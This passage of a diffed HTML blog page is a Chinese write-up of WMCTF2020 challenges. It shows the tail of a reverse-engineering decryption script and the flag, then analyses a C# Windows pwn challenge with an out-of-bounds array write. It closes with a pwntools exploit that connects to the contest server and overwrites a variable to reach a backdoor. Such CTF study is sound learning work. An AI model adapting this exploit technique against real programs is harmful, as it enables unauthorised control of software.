          enc_flag[i] = enc_flag[i]^enc_flag[(i+<span class="number">1</span>)%<span class="number">9</span>]^<span class="number">0x24114514</span> </span><br><span class="line">        <span class="keyword">elif</span>(n%<span class="number">3</span> == <span class="number">1</span>): </span><br><span class="line">            enc_flag[i] = enc_flag[i]^enc_flag[(i+<span class="number">1</span>)%<span class="number">9</span>]^<span class="number">0x1919810</span> </span><br><span class="line">        <span class="keyword">elif</span>(n%<span class="number">3</span> == <span class="number">2</span>): </span><br><span class="line">            enc_flag[i] = enc_flag[i]^enc_flag[(i+<span class="number">1</span>)%<span class="number">9</span>]^<span class="number">0x19260817</span> </span><br><span class="line">group = [<span class="literal">None</span>] * (len(enc_flag) * <span class="number">4</span>) </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>): </span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">4</span>): </span><br><span class="line">        group[i*<span class="number">4</span>+n] = (enc_flag[i]&gt;&gt;(<span class="number">8</span>*n))&amp;<span class="number">0xff</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(group)):<span class="comment">#凯撒解密 </span></span><br><span class="line">    group[i] = (group[i] - <span class="number">0x55</span>)%<span class="number">0x100</span> </span><br><span class="line"></span><br><span class="line">flag = [<span class="literal">None</span>] * len(group) </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):<span class="comment">#行列密码解密 </span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">6</span>): </span><br><span class="line">        flag[i*<span class="number">6</span>+n] = group[n*<span class="number">6</span>+i] </span><br><span class="line">key_board_mapping = &#123; </span><br><span class="line">    <span class="number">0x2</span>:<span class="string">'1'</span>, </span><br><span class="line">    <span class="number">0x3</span>:<span class="string">'2'</span>, </span><br><span class="line">    <span class="number">0x4</span>:<span class="string">'3'</span>, </span><br><span class="line">    <span class="number">0x5</span>:<span class="string">'4'</span>, </span><br><span class="line">    <span class="number">0x6</span>:<span class="string">'5'</span>, </span><br><span class="line">    <span class="number">0x7</span>:<span class="string">'6'</span>, </span><br><span class="line">    <span class="number">0x8</span>:<span class="string">'7'</span>, </span><br><span class="line">    <span class="number">0x9</span>:<span class="string">'8'</span>, </span><br><span class="line">    <span class="number">0xa</span>:<span class="string">'9'</span>, </span><br><span class="line">    <span class="number">0xb</span>:<span class="string">'0'</span>, </span><br><span class="line">    <span class="number">0xc</span>:<span class="string">'_'</span>, </span><br><span class="line">    <span class="number">0xd</span>:<span class="string">'+'</span>, </span><br><span class="line">    <span class="number">0x10</span>:<span class="string">'q'</span>, </span><br><span class="line">    <span class="number">0x11</span>:<span class="string">'w'</span>, </span><br><span class="line">    <span class="number">0x12</span>:<span class="string">'e'</span>, </span><br><span class="line">    <span class="number">0x13</span>:<span class="string">'r'</span>, </span><br><span class="line">    <span class="number">0x14</span>:<span class="string">'t'</span>, </span><br><span class="line">    <span class="number">0x15</span>:<span class="string">'y'</span>, </span><br><span class="line">    <span class="number">0x16</span>:<span class="string">'u'</span>, </span><br><span class="line">    <span class="number">0x17</span>:<span class="string">'i'</span>, </span><br><span class="line">    <span class="number">0x18</span>:<span class="string">'o'</span>, </span><br><span class="line">    <span class="number">0x19</span>:<span class="string">'p'</span>, </span><br><span class="line">    <span class="number">0x1a</span>:<span class="string">'&#123;'</span>, </span><br><span class="line">    <span class="number">0x1b</span>:<span class="string">'&#125;'</span>, </span><br><span class="line">    <span class="number">0x1e</span>:<span class="string">'a'</span>, </span><br><span class="line">    <span class="number">0x1f</span>:<span class="string">'s'</span>, </span><br><span class="line">    <span class="number">0x20</span>:<span class="string">'d'</span>, </span><br><span class="line">    <span class="number">0x21</span>:<span class="string">'f'</span>, </span><br><span class="line">    <span class="number">0x22</span>:<span class="string">'g'</span>, </span><br><span class="line">    <span class="number">0x23</span>:<span class="string">'h'</span>, </span><br><span class="line">    <span class="number">0x24</span>:<span class="string">'j'</span>, </span><br><span class="line">    <span class="number">0x25</span>:<span class="string">'k'</span>, </span><br><span class="line">    <span class="number">0x26</span>:<span class="string">'l'</span>, </span><br><span class="line">    <span class="number">0x2c</span>:<span class="string">'z'</span>, </span><br><span class="line">    <span class="number">0x2d</span>:<span class="string">'x'</span>, </span><br><span class="line">    <span class="number">0x2e</span>:<span class="string">'c'</span>, </span><br><span class="line">    <span class="number">0x2f</span>:<span class="string">'v'</span>, </span><br><span class="line">    <span class="number">0x30</span>:<span class="string">'b'</span>, </span><br><span class="line">    <span class="number">0x31</span>:<span class="string">'n'</span>, </span><br><span class="line">    <span class="number">0x32</span>:<span class="string">'m'</span>, </span><br><span class="line">    <span class="number">0x39</span>:<span class="string">' '</span>, </span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):<span class="comment">#键盘映射回去 </span></span><br><span class="line">    <span class="keyword">if</span> flag[i]&gt;<span class="number">0x39</span>: </span><br><span class="line">        flag[i] -= <span class="number">0x30</span> </span><br><span class="line">        flag[i] = key_board_mapping[flag[i]].upper() </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        flag[i] = key_board_mapping[flag[i]] </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag: </span><br><span class="line">    print(i,end = <span class="string">''</span>) </span><br><span class="line">    </span><br><span class="line"><span class="comment">#WMCTF&#123;D0_Y0u_kn0w_th3_Pr0t3ct3dM0d3&#125;</span></span><br><span class="line"><span class="comment">#也可以解出数后按照数组手动还原</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="0x04-mengyedekending"><a href="#0x04-mengyedekending" class="headerlink" title="0x04 mengyedekending"></a>0x04 mengyedekending</h1><p>一道windows pwn，用C#写的，第一次做，代码好不容易才看懂，太菜了太菜了…</p>
+<p>拿过题来是这些东西</p>
+<p><img src="https://i.loli.net/2020/08/06/3qGKAzEmVytMucQ.png" alt=""></p>
+<p>用IDA打开baby_Cat.exe很乱找不到有用的函数，但有很多类似的字符串信息</p>
+<p><img src="https://n0nop.com/img/image-20200803094211088.png" alt=""></p>
+<p>可以猜测出这个exe实际上是在加载dll，程序主要的逻辑就在加载的dll中执行。</p>
+<p>所以找到一个baby_Cat.dll，然后反编译，IDA做不到，使用dnspy，找到主函数，分析代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">private unsafe static void Main(string[] args)</span><br><span class="line">		&#123;</span><br><span class="line">			char* ptr &#x3D; stackalloc char[(UIntPtr)100]; &#x2F;&#x2F;开辟100大小的空间</span><br><span class="line">			int num &#x3D; 1;</span><br><span class="line">			int* ptr2 &#x3D; (int*)(ptr + 50);    &#x2F;&#x2F; ptr2指向ptr偏移50的位置</span><br><span class="line">			Program @object &#x3D; new Program();</span><br><span class="line">			Program.MsgHandler msgHandler &#x3D; new Program.MsgHandler(@object.Right);</span><br><span class="line">			Program.MsgHandler msgHandler2 &#x3D; new Program.MsgHandler(@object.Backdoor);&#x2F;&#x2F;  backdoor</span><br><span class="line">			Console.WriteLine(&quot;This is a gift for you : &#123;0:x4&#125;&quot;, &amp;num);&#x2F;&#x2F;输出num的地址</span><br><span class="line">			Console.WriteLine(&quot;What do you want me to repeat?&quot;);</span><br><span class="line">			ptr2[1] &#x3D; 0;  &#x2F;&#x2F;记录输入的字符个数</span><br><span class="line">			ptr2[2] &#x3D; ptr; &#x2F;&#x2F;指向ptr</span><br><span class="line">			*ptr2 &#x3D; 0; &#x2F;&#x2F;即ptr[50] &#x3D; 0</span><br><span class="line">			while (ptr2[1] &lt; 53)</span><br><span class="line">			&#123;</span><br><span class="line">				char c &#x3D; (char)Console.Read(); &#x2F;&#x2F;读入字符</span><br><span class="line">				bool flag &#x3D; c &#x3D;&#x3D; &#39;\n&#39;; &#x2F;&#x2F;若换行符则跳出</span><br><span class="line">				if (flag)</span><br><span class="line">				&#123;</span><br><span class="line">					break;</span><br><span class="line">				&#125;</span><br><span class="line">				bool flag2 &#x3D; c &#x3D;&#x3D; &#39;\r&#39;;&#x2F;&#x2F;若不是回车则进入循环</span><br><span class="line">				if (!flag2)</span><br><span class="line">				&#123;</span><br><span class="line">					ptr[*ptr2] &#x3D; c;&#x2F;&#x2F;将字符写入</span><br><span class="line">					ptr2[1]++;</span><br><span class="line">				&#125;</span><br><span class="line">				(*ptr2)++;&#x2F;&#x2F;偏移量+1</span><br><span class="line">			&#125;</span><br><span class="line">			Console.WriteLine(&quot;Do you want to change your input?&quot;);</span><br><span class="line">			char c2 &#x3D; (char)Console.Read();</span><br><span class="line">			bool flag3 &#x3D; c2 &#x3D;&#x3D; &#39;N&#39; || c2 &#x3D;&#x3D; &#39;n&#39;;</span><br><span class="line">			if (flag3)</span><br><span class="line">			&#123;</span><br><span class="line">				msgHandler(ptr);</span><br><span class="line">			&#125;</span><br><span class="line">			else</span><br><span class="line">			&#123;</span><br><span class="line">				Console.WriteLine(&quot;Please tell me a offset!&quot;);</span><br><span class="line">				char* ptr3 &#x3D; ptr2[2];</span><br><span class="line">				Console.ReadLine();</span><br><span class="line">				int num2 &#x3D; Console.Read();</span><br><span class="line">				for (int i &#x3D; 0; i &lt; num2; i++)</span><br><span class="line">				&#123;</span><br><span class="line">					char* ptr4 &#x3D; ptr3 + i;</span><br><span class="line">					*ptr4 -&#x3D; &#39;\u0001&#39;; &#x2F;&#x2F;对内存的数—1</span><br><span class="line">				&#125;</span><br><span class="line">				bool flag4 &#x3D; num &#x3D;&#x3D; 1;</span><br><span class="line">				if (flag4)</span><br><span class="line">				&#123;</span><br><span class="line">					msgHandler(ptr);</span><br><span class="line">				&#125;</span><br><span class="line">				else</span><br><span class="line">				&#123;</span><br><span class="line">					msgHandler2(ptr);        &#x2F;&#x2F;后门函数</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+
+<p>后门函数长这样:</p>
+<p><img src="https://i.loli.net/2020/08/06/Op35ZHshlN1tk86.png" alt=""></p>
+<p>分析完毕，目标就是令num==0，绕过去执行这个后门函数</p>
+<p>程序关键点在这：</p>
+<p><img src="https://i.loli.net/2020/08/06/S2mAMz3L9WFnKhZ.png" alt=""></p>
+<p><code>ptr[*ptr2]</code>存放着我们的输入c，而<em>ptr2指向了ptr+50的位置，这个位置的值初始化为0，也就是说，我们的输入放在ptr[0]的位置，接着\</em>ptr2++，使得输入逐渐后移。（啊！万恶的指针）</p>
+<p>而程序没有对数组边界进行检查，所以存在数组越界漏洞</p>
+<p>目标也很清楚了，由于程序第一个输出告诉了我们num的地址，那么我们只要找到num和输入的偏移，更改*ptr2的值，使其指向&amp;num-1的位置，下一次就可以覆盖到num==0了，进而执行backdoor</p>
+<p>dnspy动态调试，</p>
+<p><img src="https://i.loli.net/2020/08/06/dyKL8Ef6NPCmHut.png" alt=""></p>
+<p>所以可以计算偏移量：(0x02CFF000-0x02CFEF29)/2 = 0x6B  （C#使用的宽字节）</p>
+<p>因此覆盖ptr[50] ==0x6b，下一次覆盖num==’\x00’</p>
+<h2 id="0x05-exp"><a href="#0x05-exp" class="headerlink" title="0x05 exp"></a>0x05 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'111.73.46.229'</span>, <span class="number">51000</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">50</span> + chr(<span class="number">0x6b</span>) + <span class="string">'\x00'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'y'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'1 hail ld1ng!'</span>)<span class="comment">#动调发现当首字符ascii&lt;83时有效，原因在于最后的循环</span></span><br><span class="line"><span class="comment">#p.sendline('\x00')#或者 send 0 直接跳出最后一个循环</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/08/06/EfSHcGaAC6TvqNP.png" alt=""></p>
+<p>成功~</p>
+<h1 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h1><p><strong>WMware</strong>的出题人是魔鬼，我复现了一遍才体会到了炜哥的艰辛，tql</p>
 <p>全程考察汇编能力，好多都是微机原理学过的内容（全忘干净了），</p>
 <p>趁此机会复习一下吧。</p>
 <p>不过看大神们说可以用IDA？我的IDA可能有自己的想法，还是算了吧…</p>
+<p><strong>mengyedekending</strong>看上去不难，这题比赛有35解</p>
+<p>但是第一次做这种类型的题还是很难受的，特别是指针的问题，在pwn中是重点，必须好好掌握</p>
 
       
     </div>
@@ -541,7 +578,7 @@
     
     <li class="post-copyright-link hidden-xs">
       <strong>本文链接：</strong>
-      <a href="http://ld1ng.com/2020/08/05/WMare/" title="WMCTF2020 RE Wmare">http://ld1ng.com/2020/08/05/WMare/</a>
+      <a href="http://ld1ng.com/2020/08/05/WMCTF/" title="WMCTF2020">http://ld1ng.com/2020/08/05/WMCTF/</a>
     </li>
     
     <li class="post-copyright-license">
@@ -586,6 +623,10 @@
   <div class="bar-inner">
   
   <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2020/08/06/Untitled/" title="Untitled"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
+    </li>
     
     
     <li class="next">
